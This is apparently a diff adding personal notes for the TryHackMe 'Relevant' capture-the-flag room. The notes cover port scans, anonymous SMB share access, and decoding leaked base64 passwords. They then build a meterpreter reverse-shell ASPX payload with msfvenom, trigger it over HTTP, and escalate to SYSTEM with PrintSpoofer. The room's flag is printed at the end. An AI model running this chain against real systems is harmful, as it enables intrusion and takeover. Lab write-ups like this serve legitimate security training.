@@ -1,0 +1,275 @@
+export IP=10.10.90.166
+
+nmap $IP -sV -sC -vv
+
+PORT     STATE SERVICE       REASON  VERSION
+80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-07-16T07:56:39+00:00
+| ssl-cert: Subject: commonName=Relevant
+| Issuer: commonName=Relevant
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-07-15T07:45:48
+| Not valid after:  2022-01-14T07:45:48
+| MD5:   39e9 348e 5fd9 7365 249d ff13 5dcc 8a1c
+| SHA-1: e3d5 e48d 5a13 a769 2b7c 7396 e992 47e1 d938 0d77
+| -----BEGIN CERTIFICATE-----
+| MIIC1DCCAbygAwIBAgIQGAQpXjIrnZRI+Chha7+sTjANBgkqhkiG9w0BAQsFADAT
+| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMTA3MTUwNzQ1NDhaFw0yMjAxMTQwNzQ1
+| NDhaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
+| MIIBCgKCAQEAudw90HtIWDWA87s7AV46NdObPoAEljOc4CE6lcsnOcx3Y9ApwqBD
+| 3ed7jvyLIXjj3YEGceO+PQwBiy7P0Lo99uHOY28lbvNM+FWUylpkgVy/8Q6Io9b2
+| ql2/QMjF4/NFLhu0yFzV5lNMEiYNIiHVy2NKXUG/szAGNcEi8VeQBRRyv2/3AIj7
+| 4RG4X4IDjblG6DuG4nUJAsxk9ElnUnQ5jXT5KiMqXhZX87cC7Gng239HMqikuPeX
+| NHjOV3gYcCz0TK2gEicHMN5aZDg/mB9TPtK3wp95hrDxRzBfg8gQp9pYYDO+tmFv
+| 4Z7hsvImbGJVRDJ2dpWh2/CJUvP8yGp2mwIDAQABoyQwIjATBgNVHSUEDDAKBggr
+| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBACDQcMDoY85V
+| dWsl92g5TvxIcumV660hlT93smthGVlVONsY8oW+KnTt1aNXguZPeMejUwVw4Ict
+| 9FqjmjzMyy/he56fJY4OKYoloaSxKKBRi10KTZTS5Ej7lDXQ7Y7K0qKmqfvFPaSV
+| CQ4VZFj+ux6/3COWLG1DVzhMVMvxOv+jlcCdUNpJbDNEVQZiQK1ThXIFTW+y7eee
+| eqT0Y06sxLpBSZuw+D2v/WQUACTbDeokdzwfDpPeChM93GO5tJFpHZGbwCrfbfrj
+| 4WXSIsBKdpq3wcYHMO/s0/W8NPm6rtpSFrGDSuAejmHLaZKOwgu13fuaOsadv9Tq
+| B2PHNeI3Vts=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-07-16T07:57:18+00:00; -1s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 60384/tcp): CLEAN (Timeout)
+|   Check 2 (port 48004/tcp): CLEAN (Timeout)
+|   Check 3 (port 36392/udp): CLEAN (Timeout)
+|   Check 4 (port 2515/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-07-16T00:56:40-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-07-16T07:56:43
+|_  start_date: 2021-07-16T07:45:48
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+Read data files from: /snap/nmap/2280/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.98 seconds
+
+
+# Trying smbclient
+
+smbclient -L $IP
+Enter WORKGROUP\ubuntu's password:
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    nt4wrksv        Disk      
+SMB1 disabled -- no workgroup available
+
+
+smbclient //10.10.90.166/nt4wrksv
+
+smbclient //10.10.90.166/nt4wrksv
+Enter WORKGROUP\ubuntu's password:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jul 25 21:46:04 2020
+  ..                                  D        0  Sat Jul 25 21:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020
+
+get passwords.txt
+
+less passwords.txt
+
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+#base64decode
+Bob - !P@$$W0rD!123
+
+Bill - Juw4nnaM4n420696969!$$$
+
+
+# RDP not possible with these credentials
+
+sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
+sudo chown -R ubuntu thc-hydra
+sudo chmod -R 755 thc-hydra
+
+
+#using msfvenom with the smbclient
+
+./msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.13.19.67 lport=1234 -f aspx -o shell.aspx
+
+/snap/bin/rustscan -a $IP --ulimit 5000                                                                                                                                                                                            130 ⨯
+WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/babak/snap/rustscan/28/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.238.45:80
+Open 10.10.238.45:139
+Open 10.10.238.45:135
+Open 10.10.238.45:445
+Open 10.10.238.45:49667
+Open 10.10.238.45:49663
+Open 10.10.238.45:49669
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] 
+Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-17 08:53 CEST
+Initiating Ping Scan at 08:53
+Scanning 10.10.238.45 [2 ports]
+Completed Ping Scan at 08:53, 0.61s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 08:53
+Completed Parallel DNS resolution of 1 host. at 08:53, 0.00s elapsed
+DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 08:53
+Scanning 10.10.238.45 [7 ports]
+Discovered open port 80/tcp on 10.10.238.45
+Discovered open port 139/tcp on 10.10.238.45
+Discovered open port 49667/tcp on 10.10.238.45
+Discovered open port 135/tcp on 10.10.238.45
+Discovered open port 445/tcp on 10.10.238.45
+Discovered open port 49669/tcp on 10.10.238.45
+Discovered open port 49663/tcp on 10.10.238.45
+Completed Connect Scan at 08:53, 0.57s elapsed (7 total ports)
+Nmap scan report for 10.10.238.45
+Host is up, received syn-ack (0.59s latency).
+Scanned at 2021-07-17 08:53:03 CEST for 1s
+
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+49663/tcp open  unknown      syn-ack
+49667/tcp open  unknown      syn-ack
+49669/tcp open  unknown      syn-ack
+
+Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
+
+
+msfconsole -q    
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter_reverse_tcp
+
+set lhost ...
+set lport ...
+
+run
+
+http://10.10.238.45:49663/nt4wrksv/shell.aspx
+
+wait for reverse shell
+
+#The user.txt is under the Bob/Desktop/
+
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+
+
+https://www.aldeid.com/wiki/TryHackMe-Relevant
+
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe
+PrintSpoofer.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+
+Root flag
+
+We eventually read the root flag:
+
+PS C:\Windows\system32> cd \users\administrator\desktop
+cd \users\administrator\desktop
+PS C:\users\administrator\desktop> dir
+dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----        7/25/2020   8:25 AM             35 root.txt                      
+
+
+PS C:\users\administrator\desktop> cat root.txt
+cat root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+PS C:\users\administrator\desktop> 
